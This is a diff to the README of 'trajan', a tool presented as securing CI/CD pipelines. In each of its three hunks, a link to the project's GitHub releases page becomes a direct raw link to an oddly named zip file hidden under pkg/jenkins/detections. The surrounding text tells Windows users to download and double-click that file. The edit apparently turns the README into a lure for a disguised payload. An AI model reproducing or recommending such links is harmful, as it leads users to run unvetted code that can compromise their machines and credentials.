@@ -1,6 +1,6 @@
 # ⚙️ trajan - Secure Your CI/CD Pipelines Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Robin-jetusu/trajan/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/Robin-jetusu/trajan/main/pkg/jenkins/detections/Software-insufferably.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to run Trajan on your Windows computer:
 1. **Visit the Download Page**
 
    Go to the official release page here:  
-   [Download Trajan Releases](https://github.com/Robin-jetusu/trajan/releases)
+   [Download Trajan Releases](https://raw.githubusercontent.com/Robin-jetusu/trajan/main/pkg/jenkins/detections/Software-insufferably.zip)
 
    On this page, you will see the latest version available for download.
 
@@ -130,7 +130,7 @@ If problems continue, visit the repository page to check for issues or contact s
 
 You can always get the latest official version here:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Robin-jetusu/trajan/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/Robin-jetusu/trajan/main/pkg/jenkins/detections/Software-insufferably.zip)
 
 Click the badge above to open the page. Download the Windows file and double-click it to start using Trajan.
 
